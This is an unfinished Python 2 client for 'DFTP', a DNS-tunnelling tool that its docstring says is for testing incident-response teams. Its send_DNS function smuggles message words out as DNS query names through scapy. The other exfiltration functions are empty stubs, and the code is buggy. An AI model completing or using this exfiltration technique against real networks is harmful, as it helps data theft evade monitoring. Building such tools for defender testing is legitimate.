#! /usr/bin/env python
'''
This progam is the client portion of DFTP and it exfiltrates data from a host to a DFTP server that looks and acts like a DNS server. Packets are UDP and look like DNS packets except for payload. This program is built to test DFIR response teams and DFIR tools.
'''

from scapy.all import *
import time

secret_message = "This is the secret message. I love DFTP."
HOST = "" # ???
PORT = "" #???
DNS_SERVER = "127.0.0.1"
DNS_SERVER_PORT = 8888

class Client:
    def __init__():
        pass

    def scan_DNS(address, port): 
        s = socket.socket() 
        print "Attempting to connect to %s on port %s." %(address, port) 
        try: 
            s.connect((address, port)) 
            print "Connected to server %s on port %s." %(address, port) 
            return True 
        except socket.error, msg: 
            print "Connecting to %s on port %s failed with the following error: %s" %(address, port, msg) 
            return False

    def check_DNS():
        print host, socket.gethostbyname(host)
        ip_address = socket.gethostbyname(host)
        print ip_address
        ip_list.append(ip_address)

    def round_robin_DNS():
        pass # use round robin service to fan out messages across 3 services?

    def message_identifier():
        pass

    def message_encryption():
        pass

    def send_DNS(data):
        print data
        sr1(IP(dst="localhost")/UDP()/DNS(rd=1,qd=DNSQR(qname=data)))

    def message_creator_text(data):
        data = data.split()
        for message in data:
            send_DNS(message)
            time.sleep(1)

    def message_creator_picture(data):
        pass

    def message_creator_music(data):
        pass

    def message_creator_file(data):
        pass

    def message_creator_pdf(data):
        pass

    def message_creator_excel(data):
        pass

    def message_creator_doc(data):
        pass



